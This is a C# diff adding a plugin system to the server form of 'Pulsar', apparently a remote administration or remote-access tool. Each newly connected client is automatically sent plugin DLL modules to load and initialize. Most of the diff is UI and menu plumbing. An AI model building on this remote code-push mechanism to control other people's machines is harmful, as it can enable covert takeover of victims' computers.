@@ -21,6 +21,7 @@ using Pulsar.Server.Networking;
 using Pulsar.Server.Persistence;
 using Pulsar.Server.Statistics;
 using Pulsar.Server.Utilities;
+using Pulsar.Server.Plugins;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -72,6 +73,7 @@ namespace Pulsar.Server.Forms
         private readonly GetCryptoAddressHandler _getCryptoAddressHander;
         private readonly ClientDebugLog _clientDebugLogHandler;
         private readonly DeferredAssemblyHandler _deferredAssemblyHandler = new DeferredAssemblyHandler();
+        private readonly UniversalPluginResponseHandler _universalPluginResponseHandler = new UniversalPluginResponseHandler();
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object();
@@ -95,6 +97,11 @@ namespace Pulsar.Server.Forms
         private Dictionary<string, AutoTaskBehavior> _autoTaskBehaviorsByTitle = new(StringComparer.OrdinalIgnoreCase);
         private AutoTaskExecutionContext _currentAutoTaskContext;
         private readonly HashSet<string> _executedTaskClientCombinations = new HashSet<string>();
+
+        // Plugin System Fields
+        private PluginManager _pluginManager;
+        private FrmPluginManager _pluginManagerForm;
+        private ServerContext _serverContext;
 
         public FrmMain()
         {
@@ -131,6 +138,9 @@ namespace Pulsar.Server.Forms
 
             InitializeSearch();
             InitializeNotificationTracking();
+            
+            // Initialize Plugin System
+            InitializePlugins();
         }
 
         private void OnAddressReceived(object sender, Client client, string addressType)
@@ -163,6 +173,7 @@ namespace Pulsar.Server.Forms
             MessageHandler.Register(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
             MessageHandler.Register(_deferredAssemblyHandler);
+            MessageHandler.Register(_universalPluginResponseHandler);
         }
 
         private void UnregisterMessageHandler()
@@ -407,19 +418,36 @@ namespace Pulsar.Server.Forms
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
-            SaveNotificationHistory();
-            SaveAutoTasks();
-
-            ListenServer.Disconnect();
-            UnregisterMessageHandler();
-            if (_previewImageHandler != null)
+            try
             {
-                MessageHandler.Unregister(_previewImageHandler);
-                _previewImageHandler.Dispose();
+                SaveNotificationHistory();
+                SaveAutoTasks();
+
+                if (ListenServer != null)
+                    ListenServer.Disconnect();
+                    
+                UnregisterMessageHandler();
+                
+                if (_previewImageHandler != null)
+                {
+                    MessageHandler.Unregister(_previewImageHandler);
+                    _previewImageHandler.Dispose();
+                }
+                
+                if (_discordRpc != null)
+                    _discordRpc.Enabled = false;  // Disable Discord RPC on close
+                    
+                if (notifyIcon != null)
+                {
+                    notifyIcon.Visible = false;
+                    notifyIcon.Dispose();
+                }
             }
-            _discordRpc.Enabled = false;  // Disable Discord RPC on close
-            notifyIcon.Visible = false;
-            notifyIcon.Dispose();
+            catch (Exception ex)
+            {
+                // Log the error but don't prevent form closing
+                System.Diagnostics.Debug.WriteLine($"Error during form closing: {ex.Message}");
+            }
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -671,6 +699,9 @@ namespace Pulsar.Server.Forms
                     }
                 }
                 UpdateConnectedClientsCount();
+                
+                // Load plugins for the new client
+                LoadPluginsForClient(client);
             }
         }
 
@@ -713,7 +744,8 @@ namespace Pulsar.Server.Forms
                     {
                         try
                         {
-                            connectedToolStripStatusLabel.Text = $"Connected: {count}";
+                            var enabledPlugins = _pluginManager?.Plugins?.Count ?? 0;
+                            connectedToolStripStatusLabel.Text = $"Connected: {count} | Active plugins: {enabledPlugins}";
                         }
                         finally
                         {
@@ -2093,7 +2125,7 @@ namespace Pulsar.Server.Forms
             return itemClient;
         }
 
-        private Client[] GetSelectedClients()
+        public Client[] GetSelectedClients()
         {
             if (_currentAutoTaskContext != null)
             {
@@ -4860,6 +4892,238 @@ namespace Pulsar.Server.Forms
         }
 
         #endregion
+
+        #region Plugin System
+
+        private void InitializePlugins()
+        {
+            try
+            {
+                _serverContext = new ServerContext(this);
+                _pluginManager = new PluginManager(_serverContext);
+                _pluginManager.PluginsChanged += OnPluginsChanged;
+                
+                var pluginsDir = Path.Combine(Application.StartupPath, "Plugins");
+                if (!Directory.Exists(pluginsDir))
+                {
+                    Directory.CreateDirectory(pluginsDir);
+                }
+                
+                _pluginManager.LoadFrom(pluginsDir);
+                
+                ApplyUIExtensions();
+                
+                UpdatePluginStatus();
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine($"Error initializing plugins: {ex.Message}");
+            }
+        }
+
+        private void OnPluginsChanged(object sender, EventArgs e)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(new Action<object, EventArgs>(OnPluginsChanged), sender, e);
+                return;
+            }
+            
+            ApplyUIExtensions();
+            UpdatePluginStatus();
+        }
+        
+        private void ApplyUIExtensions()
+        {
+            try
+            {
+                UIExtensionManager.ApplyFormCustomizations(this);
+                UIExtensionManager.ApplyControlCustomizations(this);
+                var tabControl = FindControl<TabControl>(this);
+                if (tabControl != null)
+                {
+                    var customTabs = UIExtensionManager.GetCustomTabs();
+                    foreach (var tab in customTabs)
+                    {
+                        if (!tabControl.TabPages.Contains(tab))
+                        {
+                            tabControl.TabPages.Add(tab);
+                        }
+                    }
+                }
+                
+                var toolStrip = FindControl<ToolStrip>(this);
+                if (toolStrip != null)
+                {
+                    var customItems = UIExtensionManager.GetCustomToolbarItems();
+                    foreach (var item in customItems)
+                    {
+                        if (!toolStrip.Items.Contains(item))
+                        {
+                            toolStrip.Items.Add(item);
+                        }
+                    }
+                }
+                
+                var menuStrip = FindControl<MenuStrip>(this);
+                if (menuStrip != null)
+                {
+                    var customMenuItems = UIExtensionManager.GetCustomMenuItems();
+                    foreach (var item in customMenuItems)
+                    {
+                        // Add to a specific menu or create a new one
+                        var toolsMenu = menuStrip.Items.Find("toolsToolStripMenuItem", true).FirstOrDefault();
+                        if (toolsMenu is ToolStripMenuItem toolsMenuItem)
+                        {
+                            toolsMenuItem.DropDownItems.Add(item);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine($"Error applying UI extensions: {ex.Message}");
+            }
+        }
+        
+        private T FindControl<T>(Control parent) where T : Control
+        {
+            if (parent is T target)
+                return target;
+                
+            foreach (Control child in parent.Controls)
+            {
+                var found = FindControl<T>(child);
+                if (found != null)
+                    return found;
+            }
+            
+            return null;
+        }
+
+        private void UpdatePluginStatus()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(new Action(UpdatePluginStatus));
+                return;
+            }
+
+            var enabledPlugins = 0;
+            var connectedCount = 0;
+
+            try
+            {
+                enabledPlugins = _pluginManager?.Plugins?.Count ?? 0;
+                connectedCount = ListenServer?.ConnectedClients?.Length ?? 0;
+            }
+            catch (Exception ex)
+            {
+                EventLog("Plugin status update error: " + ex.Message, "error");
+            }
+            finally
+            {
+                // Always update status bar, even if there was an error
+                listenToolStripStatusLabel.Text = $"Listening on port: 8080";
+                connectedToolStripStatusLabel.Text = $"Connected: {connectedCount} | Active plugins: {enabledPlugins}";
+            }
+        }
+
+        private void LoadPluginsForClient(Client client)
+        {
+            try
+            {
+                if (_pluginManager?.Plugins == null) return;
+
+                foreach (var plugin in _pluginManager.Plugins)
+                {
+                    if (plugin is IServerPlugin serverPlugin)
+                    {
+                        // Load universal plugins to the client
+                        LoadUniversalPluginToClient(client, serverPlugin);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                EventLog($"Error loading plugins for client {client.EndPoint}: {ex.Message}", "error");
+            }
+        }
+
+        private void LoadUniversalPluginToClient(Client client, IServerPlugin serverPlugin)
+        {
+            try
+            {
+                // Get the plugin's client module bytes
+                var pluginType = serverPlugin.GetType();
+                var asm = pluginType.Assembly;
+                
+                // Look for embedded client module
+                var clientModuleName = $"{pluginType.Name}.ClientModule.dll";
+                var resourceName = asm.GetManifestResourceNames()
+                    .FirstOrDefault(n => n.EndsWith(clientModuleName, StringComparison.OrdinalIgnoreCase));
+                
+                if (resourceName != null)
+                {
+                    using (var stream = asm.GetManifestResourceStream(resourceName))
+                    using (var ms = new MemoryStream())
+                    {
+                        stream.CopyTo(ms);
+                        var clientBytes = ms.ToArray();
+                        
+                        // Send the plugin to the client
+                        var pluginId = $"{pluginType.Name}_{Guid.NewGuid():N}";
+                        PushSender.LoadUniversalPlugin(client, pluginId, clientBytes, null, 
+                            $"{pluginType.Name}.ClientModule", "Initialize");
+                    }
+                }
+                else
+                {
+                    // Try to load from file system
+                    var pluginsDir = Path.Combine(Application.StartupPath, "Plugins");
+                    var clientModulePath = Path.Combine(pluginsDir, $"{pluginType.Name}.ClientModule.dll");
+                    
+                    if (File.Exists(clientModulePath))
+                    {
+                        var clientBytes = File.ReadAllBytes(clientModulePath);
+                        var pluginId = $"{pluginType.Name}_{Guid.NewGuid():N}";
+                        PushSender.LoadUniversalPlugin(client, pluginId, clientBytes, null, 
+                            $"{pluginType.Name}.ClientModule", "Initialize");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                EventLog($"Error loading universal plugin {serverPlugin.GetType().Name} to client: {ex.Message}", "error");
+            }
+        }
+
+        private void UpdatePluginManagerWindow()
+        {
+            if (_pluginManagerForm?.IsDisposed == false)
+            {
+                _pluginManagerForm.Refresh();
+            }
+        }
+
+        private void pluginManagerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (_pluginManagerForm?.IsDisposed != false)
+                {
+                    _pluginManagerForm = new FrmPluginManager(_pluginManager);
+                }
+                _pluginManagerForm.Show();
+                _pluginManagerForm.BringToFront();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Error opening plugin manager: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        #endregion Plugin System
     }
 
     public class NotificationEntry
@@ -4882,11 +5146,209 @@ namespace Pulsar.Server.Forms
         public AutoTaskExecutionMode ExecutionMode { get; set; } = AutoTaskExecutionMode.OncePerClient;
     }
 
+    #endregion AutoTaskStuff
+
     public class ClientInfo
     {
         public string ClientId { get; set; }
         public string Nickname { get; set; }
     }
 
-    #endregion AutoTaskStuff
+    public sealed class ServerContext : IServerContext
+    {
+        private readonly FrmMain _form;
+        private readonly List<ToolStripMenuItem> _pluginMenuItems = new List<ToolStripMenuItem>();
+        private readonly object _pluginTag = new object();
+        
+        public ServerContext(FrmMain form) { _form = form; }
+        public Form MainForm => _form;
+        public PulsarServer Server => _form.ListenServer;
+        public void Log(string message) { _form.EventLog(message, "info"); }
+        
+        public void ClearPluginMenuItems()
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                if (_form.contextMenuStrip == null) return;
+                RemovePluginItems(_form.contextMenuStrip.Items);
+                _pluginMenuItems.Clear();
+                _form.contextMenuStrip.Refresh();
+            });
+        }
+
+        private void RemovePluginItems(ToolStripItemCollection root)
+        {
+            for (int i = root.Count - 1; i >= 0; i--)
+            {
+                if (root[i] is ToolStripMenuItem mi)
+                {
+                    RemovePluginItems(mi.DropDownItems);
+                    if (ReferenceEquals(mi.Tag, _pluginTag) || (mi.DropDownItems.Count == 0 && ReferenceEquals(mi.Tag, _pluginTag)))
+                    {
+                        root.RemoveAt(i);
+                        mi.Dispose();
+                    }
+                }
+            }
+        }
+
+        public void AddClientContextMenuItem(string text, Action<IReadOnlyList<Client>> onClick)
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                if (_form.contextMenuStrip == null) return;
+                var item = new ToolStripMenuItem(text);
+                item.Tag = _pluginTag;
+                item.Click += (s, e) =>
+                {
+                    var clients = _form.GetSelectedClients();
+                    onClick?.Invoke(clients);
+                };
+                _form.contextMenuStrip.Items.Add(item);
+                _pluginMenuItems.Add(item);
+            });
+        }
+        public void AddClientContextMenuItem(string text, Icon icon, Action<IReadOnlyList<Client>> onClick)
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                if (_form.contextMenuStrip == null) return;
+                var item = new ToolStripMenuItem(text);
+                item.Tag = _pluginTag;
+                if (icon != null)
+                {
+                    item.Image = icon.ToBitmap();
+                }
+                item.Click += (s, e) =>
+                {
+                    var clients = _form.GetSelectedClients();
+                    onClick?.Invoke(clients);
+                };
+                _form.contextMenuStrip.Items.Add(item);
+                _pluginMenuItems.Add(item);
+            });
+        }
+        public void AddClientContextMenuItem(string section, string text, Action<IReadOnlyList<Client>> onClick)
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                if (_form.contextMenuStrip == null) return;
+                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, section);
+                var item = new ToolStripMenuItem(text);
+                item.Tag = _pluginTag;
+                item.Click += (s, e) =>
+                {
+                    var clients = _form.GetSelectedClients();
+                    onClick?.Invoke(clients);
+                };
+                parent.DropDownItems.Add(item);
+                _pluginMenuItems.Add(item);
+            });
+        }
+        public void AddClientContextMenuItem(string section, string text, Icon icon, Action<IReadOnlyList<Client>> onClick)
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                if (_form.contextMenuStrip == null) return;
+                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, section);
+                var item = new ToolStripMenuItem(text);
+                item.Tag = _pluginTag;
+                if (icon != null)
+                {
+                    item.Image = icon.ToBitmap();
+                }
+                item.Click += (s, e) =>
+                {
+                    var clients = _form.GetSelectedClients();
+                    onClick?.Invoke(clients);
+                };
+                parent.DropDownItems.Add(item);
+                _pluginMenuItems.Add(item);
+            });
+        }
+        public void AddClientContextMenuItem(string[] sections, string text, Action<IReadOnlyList<Client>> onClick)
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                if (_form.contextMenuStrip == null) return;
+                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, sections[0]);
+                for (int i = 1; i < sections.Length; i++)
+                {
+                    parent = EnsureSection(parent.DropDownItems, sections[i]);
+                }
+                var item = new ToolStripMenuItem(text);
+                item.Tag = _pluginTag;
+                item.Click += (s, e) =>
+                {
+                    var clients = _form.GetSelectedClients();
+                    onClick?.Invoke(clients);
+                };
+                parent.DropDownItems.Add(item);
+                _pluginMenuItems.Add(item);
+            });
+        }
+        public void AddClientContextMenuItem(string[] sections, string text, Icon icon, Action<IReadOnlyList<Client>> onClick)
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                if (_form.contextMenuStrip == null) return;
+                ToolStripMenuItem parent = EnsureSection(_form.contextMenuStrip.Items, sections[0]);
+                for (int i = 1; i < sections.Length; i++)
+                {
+                    parent = EnsureSection(parent.DropDownItems, sections[i]);
+                }
+                var item = new ToolStripMenuItem(text);
+                item.Tag = _pluginTag;
+                if (icon != null)
+                {
+                    item.Image = icon.ToBitmap();
+                }
+                item.Click += (s, e) =>
+                {
+                    var clients = _form.GetSelectedClients();
+                    onClick?.Invoke(clients);
+                };
+                parent.DropDownItems.Add(item);
+                _pluginMenuItems.Add(item);
+            });
+        }
+        public void AddClientContextMenuItemPath(string path, string text, Action<IReadOnlyList<Client>> onClick)
+        {
+            var sections = path.Split('\\', '/');
+            AddClientContextMenuItem(sections, text, onClick);
+        }
+        public void AddClientContextMenuItemPath(string path, string text, Icon icon, Action<IReadOnlyList<Client>> onClick)
+        {
+            var sections = path.Split('\\', '/');
+            AddClientContextMenuItem(sections, text, icon, onClick);
+        }
+        public void ApplyTheme(Action<Form> apply)
+        {
+            if (_form == null || _form.IsDisposed) return;
+            _form.Invoke((MethodInvoker)delegate
+            {
+                apply?.Invoke(_form);
+            });
+        }
+
+        private ToolStripMenuItem EnsureSection(ToolStripItemCollection root, string name)
+        {
+            var found = root.OfType<ToolStripMenuItem>().FirstOrDefault(mi => mi.Text == name);
+            if (found == null)
+            {
+                found = new ToolStripMenuItem(name);
+                found.Tag = _pluginTag;
+                root.Add(found);
+                _pluginMenuItems.Add(found);
+            }
+            return found;
+        }
+    }
 }
